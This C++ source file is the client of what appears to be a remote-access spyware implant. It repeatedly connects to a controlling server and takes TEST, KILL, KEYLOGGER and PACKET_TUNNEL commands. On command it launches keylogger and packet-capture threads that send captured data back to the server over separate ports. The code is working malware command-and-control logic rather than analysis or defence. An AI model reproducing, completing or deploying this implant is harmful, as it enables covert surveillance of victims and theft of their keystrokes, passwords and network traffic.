#include "client.hpp"

Client::Client(const char* __ip, const int __port): port_(__port), socket_(-1) {
    for (int i=0; i<MAX_IP_LEN; i++) {
        ip_[i] = __ip[i];
        if (__ip[i] == '\0') {
            break;
        }
    }
}

int Client::is_valid_tunnel(CommandCode __tunnel_code) {
    CommandCode code=KEYLOGGER;
    for (int i=0;i<TUNNEL_NUMS;i++) {
        if (code == __tunnel_code) {
            return 0;
        }
        code <<= 1;
    }
    return -1;
}

CLTunnel* Client::get_cltunnel(CommandCode __tunnel_code) {
    if (is_valid_tunnel(__tunnel_code) == 0) {
        printf("[Client::get_cltunnel] index: %d\n", (int) (log(__tunnel_code)/log(2)) - 2);
        return &cltunnels_[(int) (log(__tunnel_code)/log(2)) - 2];
    }
    return nullptr;
}

int Client::init() {
    memset(&server_addr_, 0, sizeof(server_addr_));
    server_addr_.sin_family = AF_INET;
    server_addr_.sin_port = htons(port_);
    if (inet_pton(AF_INET, ip_, &server_addr_.sin_addr) <= 0) {
        printf("[Client] Invalid address or address not supported\n");
        return -1;
    }

    printf("[Client] Initializing successful\n");
    return 0;
}

void Client::start() {
    uint16_t command;
    char buffer[OUT_SIZE];
    int rc;
    int error = 0;
    socklen_t len = sizeof(error);
    CommandCode command_code = 0;
    int command_arg = 0;

    while (!shutdown_flag_) {
        retry_flag_ = false;
        
        socket_ = socket(AF_INET, SOCK_STREAM, 0);
        if (socket_ < 0) {
            printf("[Client] Socket creation failed: %s\n", strerror(errno));
            goto retry;
        }

        if (connect(socket_, (struct sockaddr*)&server_addr_, sizeof(server_addr_)) < 0) {
            if (errno == ECONNREFUSED || errno == ETIMEDOUT) {
                printf("[Client] Trying to connect to the server\n");
                goto retry;
            } else {
                printf("[Client] Connection failed: %s\n", strerror(errno));
                return;
            }
        }
        
        if (getsockopt(socket_, SOL_SOCKET, SO_ERROR, &error, &len) < 0) {
            printf("[Client] Connection verification failed: %s\n", strerror(error));
            goto retry;
        }
        printf("[Client] Connected to server %s:%d\n", ip_, port_);


        while (!shutdown_flag_) {
            rc = recv(socket_, &command, sizeof(command), 0);
            if (rc < 0) {
                printf("[Client] Error receiving data: %s\n", strerror(errno));
                break;
            } else if (rc == 0) {
                printf("[Client] Server closed connection\n");
                break;
            }

            command_code = static_cast<CommandCode>(command >> 8);
            command_arg = static_cast<int>(command & 0x00FF);

            if (command_code == TEST) {
                printf("[Client] Received TEST command\n");
                rc = send_out(socket_, EXEC_SUCCESS);
                if (rc < 0) {
                    printf("[Client] Error sending data: %s\n", strerror(errno));
                    break;
                }
            } else if (command_code == KILL) {
                printf("[Client] Received KILL command\n");
                rc = send_out(socket_, EXEC_SUCCESS);
                if (rc < 0) {
                    printf("[Client] Error sending data: %s\n", strerror(errno));
                    break;
                }
                shutdown();
                break;
            } else if (is_valid_tunnel(command_code) == 0) {
                CLTunnel* tunnel = get_cltunnel(command_code);

                if (tunnel == nullptr) {
                    printf("[Client] Invalid tunnel code\n");
                    continue;
                }

                if (command_arg > 0) {
                    // Create a tunnel object with the appropriate type                    
                    if (tunnel->thread_running_) {
                        printf("[Client] Tunnel already running\n");
                        send_out(socket_, EXEC_ERROR);
                        continue;
                    }
                    
                    CLSpyTunnel* clspy_tunnel = nullptr;
                    if (command_code == KEYLOGGER) {
                        printf("[Client] Received KEYLOGGER command. Port: %d\n", command_arg+port_);
                        clspy_tunnel = new CLKeylogger();
                        rc = clspy_tunnel->init(ip_, port_ + command_arg, TCP_BASED);
                    } else if (command_code == PACKET_TUNNEL) {
                        printf("[Client] Received PACKET_TUNNEL command");
                        clspy_tunnel = new CLPacketTunnel();
                        rc = clspy_tunnel->init(ip_, port_ + command_arg, TCP_BASED);
                    }

                    if (rc < 0) {
                        delete clspy_tunnel;
                        clspy_tunnel = nullptr;
                        send_out(socket_, EXEC_ERROR);
                        continue;
                    }
                    tunnel->clspy_tunnel_ = clspy_tunnel;

                    rc = pthread_create(&tunnel->thread, NULL, cltunnel_helper, (void*)tunnel);
                    if (rc != 0) {
                        printf("[Client] Error creating thread: %s\n", strerror(rc));
                        delete clspy_tunnel;
                        clspy_tunnel = nullptr;
                        send_out(socket_, EXEC_ERROR);
                        continue;
                    }

                    tunnel->thread_running_ = true;
                } else if (command_arg == 0) {
                    if (tunnel->thread_running_) {
                        printf("[Client] Received shutdown command for tunnel\n");
                        tunnel->clspy_tunnel_->tunnel_shutdown_flag_ = true;
                        pthread_join(tunnel->thread, NULL);
                        tunnel->thread_running_ = false;
                        delete tunnel->clspy_tunnel_;
                        tunnel->clspy_tunnel_ = nullptr;
                        send_out(socket_, EXEC_SUCCESS);
                    } else {
                        printf("[Client] Tunnel not running\n");
                        send_out(socket_, EXEC_ERROR);
                    }
                }
            }
        }
        retry:
            if (!shutdown_flag_) {
                if (socket_ >= 0) {
                    close(socket_);
                    socket_ = -1;
                }
            }

            for (int i=0; i<TUNNEL_NUMS; i++) {
                if (cltunnels_[i].thread_running_) {
                    cltunnels_[i].clspy_tunnel_->tunnel_shutdown_flag_ = true;
                }
                if (cltunnels_[i].thread_running_) {
                    pthread_join(cltunnels_[i].thread, NULL);
                }
            }

            sleep(1);
            printf("[Client] Retrying connection...\n");
    }
}

void Client::cleanup() {
    if (socket_ >= 0) {
        close(socket_);
        socket_ = -1;
    }

    for (int i=0; i<TUNNEL_NUMS; i++) {
        if (cltunnels_[i].thread_running_) {
            cltunnels_[i].clspy_tunnel_->tunnel_shutdown_flag_ = true;
            pthread_join(cltunnels_[i].thread, NULL);
            delete cltunnels_[i].clspy_tunnel_;
        }
    }
}

void Client::shutdown() {
    shutdown_flag_ = true;
    printf("[Client] Shutting down client\n");
    
    cleanup();
}